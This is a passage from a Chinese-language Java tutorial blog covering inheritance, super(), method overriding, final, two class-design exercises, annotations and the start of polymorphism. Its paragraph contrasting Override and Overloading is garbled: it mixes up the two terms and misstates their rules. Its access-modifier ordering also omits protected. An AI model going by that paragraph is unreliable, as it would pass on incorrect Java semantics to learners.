class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test8</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        stu.setName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        stu.setAge(<span class="number">30</span>);</span><br><span class="line">        stu.setSchool(<span class="string">&quot;家里蹲&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;姓名： &quot;</span> + stu.getName() + <span class="string">&quot;年龄： &quot;</span> + stu.getAge() + <span class="string">&quot;学校：&quot;</span> + stu.getSchool());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73530.jpg"                      alt="image-20220325010930744"                ></p><h5 id="子类对象实例化流程"><a href="#子类对象实例化流程" class="headerlink" title="子类对象实例化流程"></a>子类对象实例化流程</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person4</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person4</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【Person】父类实例化对象产生&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student2</span> <span class="keyword">extends</span> <span class="title class_">Person4</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student2</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【student】子类实例化对象产生&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test9</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Student2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    结果为：</p><p>​    【Person】父类实例化对象产生<br>​    【student】子类实例化对象产生</p><p>​    <strong>实例化子类，也会自动调用父类的构造方法(实例化父类对象)，默认情况下的会自动实例化父类对象。这时候相当于子类的构造方法隐含了一个super()。</strong></p><p>​    <strong>super()表示的就是自动调用父类构造的语句，该语句只允许放在子类构造方法的首行。并且默认情况下，子类只会调用父类中的无参构造方法，所以上例写不写super()区别不大，但是如果说父类没有无参构造，必须利用super()明确调用有参构造。</strong></p><p>​    <strong>super()和this都可以调用构造方法，super是由子类调用父类的构造，this是调用本类的构造，并且都要放在首行，所以不允许同时出现。</strong></p><h5 id="继承相关限制"><a href="#继承相关限制" class="headerlink" title="继承相关限制"></a>继承相关限制</h5><p>​    1、Java中不允许多重继承，只允许多层继承。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">!!!!!!错误的代码，多重继承</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>&#123;&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> <span class="keyword">extends</span> <span class="title class_">A</span>,B&#123;&#125;;</span><br></pre></td></tr></table></figure><p>​    2、在进行继承操作的时候，实际上子类可以继承父类中的所有的操作结构。但是对于私有操作是隐式继承，而非私有操作属于显式继承。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person5</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student3</span> <span class="keyword">extends</span> <span class="title class_">Person5</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student3</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        setName(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fun</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//System.out.println(name);因为是私有的，不能操作</span></span><br><span class="line">        System.out.println(getName());<span class="comment">//间接访问</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test10</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Student3</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student3</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        stu.fun();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    子类至少会维持父类的现有功能。</p><hr><h4 id="覆写"><a href="#覆写" class="headerlink" title="覆写"></a>覆写</h4><h5 id="方法覆写"><a href="#方法覆写" class="headerlink" title="方法覆写"></a>方法覆写</h5><p>​    子类和父类一旦产生继承后，会继承父类全部定义，如果子类发现父类中设计不足并且需要保留有父类中的方法或者属性名称的情况下就会发生覆写。</p><p>​    1、方法覆写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Channel</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">connect</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【channel父类】进行资源的连接&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DatabaseChannel</span> <span class="keyword">extends</span> <span class="title class_">Channel</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">connect</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【子类】进行数据库资源的连接&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">DatabaseChannel</span> <span class="variable">channel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatabaseChannel</span>();</span><br><span class="line">        channel.connect();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    子类覆写之后如果想调用父类的方法，用super.方法()。</p><p>​    <strong>只要是在子类中调用父类方法的时候一定要在方法前追加有”super”。</strong></p><h5 id="方法覆写限制"><a href="#方法覆写限制" class="headerlink" title="方法覆写限制"></a>方法覆写限制</h5><p>​    被覆写的方法不能拥有比父类方法更严格的访问控制权限。</p><p>​    public&gt;default(不写)&gt;private，如果父类用defautle定义，子类只能用public或者default定义，父类用public定义，子类只能用public定义。</p><p>​    private问题：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Channel</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">connect</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【channel父类】进行资源的连接&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fun</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.connect();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DatabaseChannel</span> <span class="keyword">extends</span> <span class="title class_">Channel</span>&#123;</span><br><span class="line">    <span class="comment">//此时并不是一个覆写，因为父类的connetc方法不可见，此时相当于一个新的方法！</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">connect</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【子类】进行数据库资源的连接&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">DatabaseChannel</span> <span class="variable">channel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatabaseChannel</span>();</span><br><span class="line">        channel.fun();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Override与Overloading的区别："><a href="#Override与Overloading的区别：" class="headerlink" title="Override与Overloading的区别："></a>Override与Overloading的区别：</h5><p>​    Overloading是重载，Override是覆写。Overloading方法名称相同，参数的名称和个数不同，Override方法名称参数类型及个数返回值不同；Overloading没有权限限制，Overloading被覆写方法不能拥有更严格的控制权限；Overloading发生在一个类中，Override发生在重载关系类中。</p><p>​    在进行方法重载时，不限制返回类型，但原则上应该保持一致。</p><h5 id="属性覆盖"><a href="#属性覆盖" class="headerlink" title="属性覆盖"></a>属性覆盖</h5><p>​    当子类定义了与父类相同名称的成员时候就称为属性覆盖。</p><h5 id="final关键字"><a href="#final关键字" class="headerlink" title="final关键字"></a>final关键字</h5><p>​    final描述的是终结器的概念，可实现一下功能</p><p>​    1、定义不能够被继承的类、不能够被覆写的方法、常量。</p><p>​    2、当子类继承了父类后实际上是可以进行父类中方法覆写的，但是不想被覆写可以使用final来定义。（底层设计相关可能常用）</p><p>​    3、用来定义常量（不可修改的值）</p><p>​        全局常量一般使用public static final int ON = 1定义，ON就是常量，常量必须全部大写。</p><hr><h4 id="总结二"><a href="#总结二" class="headerlink" title="总结二"></a>总结二</h4><h5 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h5><p>​    建立一个人类（Person）和学生类（Student）：</p><p>​    1、Person中包含4个私有型的数据成员name、addr、sex、age，分别为字符串型、字符串型、字符型及整形，表示姓名、地址、性别和年龄。一个4参构造方法、一个两参构造方法、一个无参构造方法、一个输出方法、一个输出方法显示4种属性。</p><p>​    2、Student类继承Person类，并增加math、english存放数学和英语成绩。一个6参构造方法、一个两参构造方法、一个无参数构造方法和重写输出方法用于显示6种属性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person3</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String addr;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">char</span> sex;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person3</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person3</span><span class="params">(String name, String addr)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(name, addr, <span class="string">&#x27;男&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person3</span><span class="params">(String name, String addr, <span class="type">char</span> sex, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.addr = addr;</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;姓名：&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;、地址：&quot;</span> + <span class="built_in">this</span>.addr + <span class="string">&quot;、性别：&quot;</span> + sex + <span class="string">&quot;、年龄：&quot;</span> + age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student4</span> <span class="keyword">extends</span> <span class="title class_">Person3</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> math;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> english;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student4</span><span class="params">(String name, String addr)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(name, addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student4</span><span class="params">(String name, String addr, <span class="type">char</span> sex, <span class="type">int</span> age, <span class="type">double</span> math, <span class="type">double</span> english)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(name, addr, sex, age);</span><br><span class="line">        <span class="built_in">this</span>.math = math;</span><br><span class="line">        <span class="built_in">this</span>.english = english;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.getInfo() + <span class="string">&quot;、数学成绩：&quot;</span> + <span class="built_in">this</span>.math + <span class="string">&quot;、英语成绩：&quot;</span> + <span class="built_in">this</span>.english;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test12</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Student4</span> <span class="variable">student4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student4</span>(<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;天安门&quot;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="number">12</span>,<span class="number">78.99</span>,<span class="number">89.98</span>);</span><br><span class="line">        System.out.println(student4.getInfo());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h5><p>​    编写程序，统计出字符串“want you to know one thing”中字母n和字母o的出现次数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StringUtil1</span> &#123;</span><br><span class="line">    <span class="comment">//返回第一个为n的个数，第二个为字母o的个数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] count(String str) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> countData[] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>];</span><br><span class="line">        <span class="type">char</span>[] data = str.toCharArray();<span class="comment">//将字符串变为字符数组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; data.length; x++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (data[x] == <span class="string">&#x27;n&#x27;</span> || data[x] == <span class="string">&#x27;N&#x27;</span>) &#123;</span><br><span class="line">                countData[<span class="number">0</span>]++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (data[x] == <span class="string">&#x27;o&#x27;</span> || data[x] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                countData[<span class="number">1</span>]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> countData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test13</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;want you to know one thing&quot;</span>;</span><br><span class="line">        <span class="type">int</span> result[] = StringUtil1.count(str);</span><br><span class="line">        System.out.println(<span class="string">&quot;字母n的个数：&quot;</span> + result[<span class="number">0</span>]);</span><br><span class="line">        System.out.println(<span class="string">&quot;字母o的个数：&quot;</span> + result[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    以上的解决方案严格来讲只是一种顺序式的思维模式解决的，假设说现在统计的事字母o和字母n的个数，那么还有可能进行其他的字符统计。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StringUtil3</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String content;<span class="comment">//需要保存字符串</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">StringUtil3</span><span class="params">(String content)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.content = content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getContent</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">()</span>&#123; <span class="comment">//默认的信息返回</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getContent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StringCount</span> <span class="keyword">extends</span> <span class="title class_">StringUtil3</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> nCount;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> oCount;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">StringCount</span><span class="params">(String content)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(content);</span><br><span class="line">        <span class="built_in">this</span>.countChar();<span class="comment">//构造方法统计</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">countChar</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">char</span>[] data = <span class="built_in">super</span>.getContent().toCharArray();<span class="comment">//将字符串变为字符数组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; data.length; x++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (data[x] == <span class="string">&#x27;n&#x27;</span> || data[x] == <span class="string">&#x27;N&#x27;</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.nCount++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (data[x] == <span class="string">&#x27;o&#x27;</span> || data[x] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.oCount++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNCount</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.nCount;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getOCount</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.oCount;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;字母n的个数：&quot;</span>+<span class="built_in">this</span>.nCount+<span class="string">&quot;、字母o的个数：&quot;</span>+<span class="built_in">this</span>.oCount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test14</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">StringCount</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringCount</span>(<span class="string">&quot;want you to know one thing&quot;</span>);</span><br><span class="line">        System.out.println(sc.getInfo());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="Annotation注解类"><a href="#Annotation注解类" class="headerlink" title="Annotation注解类"></a>Annotation注解类</h4><h5 id="Annotation简介"><a href="#Annotation简介" class="headerlink" title="Annotation简介"></a>Annotation简介</h5><p>​    JDK1.5之后，利用Annotation可以有效减少程序配置的代码，并且使用其进行一些结构化定义。Annotation是以一种注解的形式实现的程序开发。</p><p>​    <img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073530.jpg"                      alt="image-20220420234012342"                ></p><p>​    代码开发经历过三个阶段：</p><p>​    1、在程序定义的时候将所有可能使用到的资源全部定义在程序代码之中：</p><p>​        如果此时服务器地址改变，程序就要改，极不方便。</p><p>​    2、引入配置文件，在配置文件之中定义程序需要的服务器资源</p><p>​        配置文件不多情况，好用，但是多的时候配置文件特别多。并且所有的文件都要通过配置文件完成，开发难度提升。</p><p>​    3、将配置信息重新写回程序，利用一些特殊的标记与程序代码进行分离。</p><p>​        现在基本是配置文件+注解。</p><p>​    重点讲以下几个注解：@override、@Deprecated、@SuppressWarnings</p><h5 id="准确覆写-override"><a href="#准确覆写-override" class="headerlink" title="准确覆写@override"></a>准确覆写@override</h5><p>​    当子类继承某一个父类之后如果发现父类中的某些方法功能不足的时候往往会采用覆写的形式来扩充。</p><p>​    开发中会有两个经常的问题：1、忘记写extend。2、覆写时单词写错了。并且这两个错都不会报错。现在追加注解IDEA自动做了。</p><h5 id="过期声明-操作-：-Deprecated"><a href="#过期声明-操作-：-Deprecated" class="headerlink" title="过期声明(操作)：@Deprecated"></a>过期声明(操作)：@Deprecated</h5><p>​    指的是在软件项目迭代开发中，可能有某个类有所不周，导致新版本有不适应的地方，这个时候不能直接删除这些操作，那么就希望有过度时间。可以采用@Deprecated注解。</p><h5 id="压制警告：-SuppressWarings"><a href="#压制警告：-SuppressWarings" class="headerlink" title="压制警告：@SuppressWarings"></a>压制警告：@SuppressWarings</h5><p>​    以之前的过期声明为例，可以发现程序在进行编译的时候会出现一个错误的提示信息：使用的过期的API。如果此时不愿意见到这个信息，可以进行压制警告信息。做的只是让警告信息不出现。</p><hr><h4 id="多态性"><a href="#多态性" class="headerlink" title="多态性"></a>多态性</h4><h5 id="多态性简介"><a href="#多态性简介" class="headerlink" title="多态性简介"></a>多态性简介</h5><p>​    多态性是面向对象中的第三大主要特征，多态性是在继承性的基础之上扩展出来的概念，也就是说可以实现父子类之间的相互转换处理。</p><p>​    在Java之中对于多态性有两种实现的模式：</p><p>​    1、方法的多态性：</p><p>​        方法的重载：同一个方法名称可以根据传入的参数的类型或个数的不同实现不同功能的执行。</p><p>​        方法的覆写：同一个方法可能根据使用子类的不同有不同的实现。</p><p>​    2、对象的多态性：</p><p>​        父子实例之间的转换处理，它有两种模式：</p><p>​        1&gt;对象向上转型：父类 父类实例 = 子类实例、自动完成转换；</p><p>​        2&gt;对象向下转型：子类 子类实例 = 